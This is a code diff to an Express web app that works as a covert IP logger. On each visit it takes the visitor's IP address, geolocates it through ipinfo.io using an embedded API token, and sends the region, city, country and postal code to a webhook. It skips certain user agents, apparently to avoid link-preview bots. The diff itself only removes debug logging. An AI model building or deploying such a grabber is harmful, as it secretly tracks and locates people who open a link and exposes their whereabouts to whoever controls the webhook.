@@ -48,16 +48,8 @@ async function sendWebhook(channelID, embed) {
 app.get("/", async (req, res) => {
   const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const userAgent = req.headers["user-agent"];
-
   const isUnwantedUserAgent = unwantedUserAgents.some((unwantedUserAgent) => userAgent.includes(unwantedUserAgent));
-
-  console.log("User Agent:", userAgent);
-  console.log("Is Unwanted User Agent:", isUnwantedUserAgent);
-
-  if (isUnwantedUserAgent) {
-    res.status(200).send("Skipping unwanted User Agent");
-    return;
-  }
+  if (isUnwantedUserAgent) { res.status(200).send("Skipping unwanted User Agent"); return; }
   const response = await fetch(`https://ipinfo.io/${ipAddress}?token=2001557f8b906a`);
   const data = await response.json();
   const { region, city, country, postal } = data;
@@ -84,7 +76,6 @@ app.get("/", async (req, res) => {
       .setTimestamp();
 
     await sendWebhook(channelID, embed);
-    console.log("Webhook message sent"); // Add this line
     res.send("Address Logged");
   } catch (error) {
     console.error(`Error handling request: ${error}`);
